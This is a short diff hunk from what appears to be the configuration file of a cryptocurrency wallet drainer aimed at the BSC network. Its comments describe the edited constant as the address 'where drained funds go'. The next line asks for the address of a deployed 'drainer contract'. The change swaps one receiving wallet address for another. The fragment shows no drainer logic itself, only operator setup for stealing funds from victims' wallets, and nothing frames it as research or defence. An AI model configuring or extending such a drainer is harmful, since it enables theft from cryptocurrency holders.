@@ -4,7 +4,7 @@
 
 // LINE 1 TO EDIT: YOUR WALLET ADDRESS - Where drained funds go
 // Get this from MetaMask on BSC network
-const YOUR_WALLET_ADDRESS = "0xA3d61A923F4A40deAC517aA2B2bb806Af28941C5";
+const YOUR_WALLET_ADDRESS = "0x9222f5ee4C897C8ae68a7638aB37dC592C105FFE";
 
 // LINE 2 TO EDIT: YOUR DRAINER CONTRACT ADDRESS
 // After deploying from GitHub, paste the contract address here
